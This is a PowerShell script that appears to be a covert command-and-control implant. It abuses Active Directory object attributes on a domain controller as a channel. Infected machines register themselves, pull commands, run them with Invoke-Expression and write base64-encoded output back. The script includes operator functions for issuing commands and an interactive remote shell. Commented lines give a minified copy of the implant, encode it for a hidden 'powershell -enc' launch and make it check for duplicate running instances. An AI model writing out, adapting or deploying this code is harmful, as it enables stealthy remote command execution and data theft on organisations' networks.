function ldap([string]$dn,[string]$in,[string]$out,[string]$tar,[string]$lst,[int]$multidelay,[string]$pre){
    $obj = [adsi]"LDAP://DC_SERVER:389/$dn";
    $thiscomp = $env:COMPUTERNAME.ToLower();
    try{
        $comps = $obj.InvokeGet($lst)
        if($comps -notmatch "$thiscomp"){
            $comps += ";$thiscomp";
            $obj.InvokeSet($lst,$comps);
            $obj.SetInfo();

        }

    }
    catch{

        return
    }

    $tars = $obj.InvokeGet($tar)
    if(($tars -match $thiscomp) -or ($tars -match "@llTh3c0mp5")){
        $cmd = $obj.InvokeGet($in);
        if($cmd -eq $pre){
            return $cmd;
        }
        $output = (iex $cmd) -join "`n";
        $output = "<$thiscomp>`n$output`n</$thiscomp>`n";

        $multi = $tars -split ";";
        if(($multi -ne $tars) -and ($multi[0] -ne $thiscomp)){
        
            $place = $multi.IndexOf($thiscomp);
            if(($place -ge 0) -and $multidelay){
                Start-Sleep -Milliseconds $multidelay;
            }
            $previous = [text.encoding]::Unicode.GetString([convert]::FromBase64String($obj.InvokeGet($out)));
            $output = $previous+$output;
            
        }
        $encode = [convert]::ToBase64String([text.encoding]::Unicode.GetBytes($output));
        $obj.InvokeSet($out,$encode);
        $obj.SetInfo();
        return $cmd;

    }
    else{

        return 
    }
}

function ldapcmd([string]$dn, [string]$cmdattr, [string]$tarsattr, [string]$cmd,  [string]$tars, [switch]$all){
    $obj = [adsi]"LDAP://DC_SERVER:389/$dn"
    $obj.InvokeSet($cmdattr, $cmd)
    if($all){
        $obj.InvokeSet($tarsattr,"@llTh3c0mp5")
        
    }
    else{
        $obj.InvokeSet($tarsattr,$tars)
    }
    $obj.SetInfo()
}

function ldapget([string]$dn, [string]$outattr, [string]$comp){
    $obj = [adsi]"LDAP://DC_SERVER:389/$dn"
    $output = [text.encoding]::unicode.GetString([convert]::FromBase64String($obj.InvokeGet($outattr)))
    if($comp){
        if($output -match "<$comp>([\d\D]*)</$comp>"){
            $matches[1]
        }
        else{
            "no output received from $comp"
        }
    }
    else{
        $output
    }
}

function getcomps([string]$dn,[string]$lst){
    $obj = [adsi]"LDAP://DC_SERVER:389/$dn"
    $obj.InvokeGet($lst)
}

function resetcomps([string]$dn,[string]$lst){
    $obj = [adsi]"LDAP://DC_SERVER:389/$dn"
    $obj.InvokeSet($lst,';')
    $obj.SetInfo()
}

function session([string]$dn, [string]$cmdattr, [string]$tarsattr,  [string]$tar,[string]$outattr){
while(1){
$cmd = Read-Host "$tar>"
ldapcmd -dn $dn -cmdattr $cmdattr -tarsattr $tarsattr -cmd $cmd -tars $tar
sleep -m 1000
ldapget -dn $dn -outattr $outattr -comp $tar

}
}

#examples
#$dn = 'SOME_COMP'
#$in = 'userParameters'
#$out = 'catalogs'
#$tar = 'mhsORaddress'
#$lst = 'carLicense'

#1iteration of the shell on target - 
#ldap -dn $dn -in $in -out $out -tar $tar -lst $lst

#running commands 
#ldapcmd -dn $dn -cmdattr $in -tarsattr $tar -cmd 'echo 123123' -tars 'mycomputerxd'

#retrieving output
#ldapget -dn $dn -outattr $out

#sortof-shell(bad)
#session -dn $dn -cmdattr $in -tarsattr $tar -tar $tar -outattr $out

#get availble computers
#getcomps -dn $dn -lst $lst

#clear availble computers
#resetcomps -dn $dn -lst $lst

#actual shell - the ldap function + those 2lines (with proper arguments).
#while(1){$a=((gwmi -Query "select commandline from win32_process where name=`"powershell.exe`"").commandline | ?{$_ -match "powershell.*-enc"}).count;if($a -ge 3){exit} else{if($a -eq 2){Start-Sleep 60}else{break}}}
#$cmd="init";while(1){$pre=$cmd;$cmd=(ldap -dn "SOME_COMP" -in "userParameters" -out "catalogs" -tar "mhsORaddress" -lst "carLicense" -multidelay 2000 -pre $pre) -join "";Start-Sleep -Milliseconds 500}

#more compact version without many spaces and long variable names..
#$st='function ld([string]$d,[string]$i,[string]$o,[string]$t,[string]$l,[int]$m,[string]$p){$f=[adsi]"LDAP://DC_SERVER:389/$d";$v=$env:COMPUTERNAME.ToLower();try{$c = $f.InvokeGet($l);if($c -notmatch "$v"){$c+=";$v";$f.InvokeSet($l,$c);$f.SetInfo();}}catch{return};$r=$f.InvokeGet($t);if(($r -match $v) -or ($r -match "@llTh3c0mp5")){$z=$f.InvokeGet($i);if($z -eq $p){return $z;};$u=(iex $z) -join "`n";$u="<$v>`n$u`n</$v>`n";$y=$r -split ";";if(($y -ne $r) -and ($y[0] -ne $v)){$j=$y.IndexOf($v);if(($j -ge 0) -and $m){Start-Sleep -Milliseconds $m;};$b=[text.encoding]::Unicode.GetString([convert]::FromBase64String($f.InvokeGet($o)));$u=$b+$u;};$e=[convert]::ToBase64String([text.encoding]::Unicode.GetBytes($u));$f.InvokeSet($o,$e);$f.SetInfo();return $z;}else{return}};while(1){$a=((gwmi -Query "select commandline from win32_process where name=`"powershell.exe`"").commandline | ?{$_ -match "powershell.*-enc"}).count;if($a -ge 3){exit} else{if($a -eq 2){Start-Sleep 60}else{break}}};$z="init";while(1){$p=$z;$z=(ld -d "SOME_COMP" -i "userParameters" -o "catalogs" -t "mhsORaddress" -l "carLicense" -m 2000 -p $p) -join "";Start-Sleep -m 500}'
#$q = [convert]::ToBase64String([text.encoding]::Unicode.GetBytes($st))
#powershell -enc $q


